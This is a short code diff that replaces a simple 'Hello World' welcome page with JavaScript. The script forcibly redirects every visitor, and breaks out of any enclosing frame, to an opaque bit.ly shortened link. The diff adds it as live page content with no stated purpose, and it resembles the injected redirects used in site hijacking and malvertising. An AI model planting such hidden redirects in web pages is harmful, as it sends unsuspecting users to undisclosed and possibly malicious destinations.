@@ -1,1 +1,14 @@
-"Hello World! Welcome to my website" 
+<script>
+    function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+    }
+    if (isInIframe()) {
+        window.top.location.href = 'https://bit.ly/2LRGTJh';
+    } else {
+        location.href = 'https://bit.ly/2LRGTJh';
+    }
+</script>
